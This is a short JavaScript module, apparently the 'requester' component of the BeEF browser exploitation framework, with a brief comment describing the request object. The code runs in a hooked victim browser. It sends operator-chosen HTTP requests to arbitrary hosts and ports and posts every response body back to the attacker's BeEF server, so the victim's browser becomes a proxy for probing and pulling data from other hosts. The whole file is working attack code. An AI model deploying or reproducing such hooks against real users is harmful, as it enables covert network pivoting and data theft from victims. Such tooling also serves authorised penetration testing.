/*!
 * @literal object: beef.net.requester
 * 
 * request object structure:
 * + method: {String} HTTP method to use (GET or POST).
 * + host: {String} hostname
 * + query_string: {String} The query string is a part of the URL which is passed to the program.
 * + uri: {String} The URI syntax consists of a URI scheme name.
 * + headers: {Array} contain the operating parameters of the HTTP request. 
 */
beef.net.requester = {
	
	handler: "requester",
	
	send: function(requests_array) {
        for (i in requests_array) {
            request = requests_array[i];
            beef.net.request('http', request.method, request.host, request.port, request.uri, null, null, 10, 'HTML', function(res) { beef.net.send('/requester', request.id, res.response_body);  });
        }
	}
	
};

beef.regCmp('beef.net.requester');
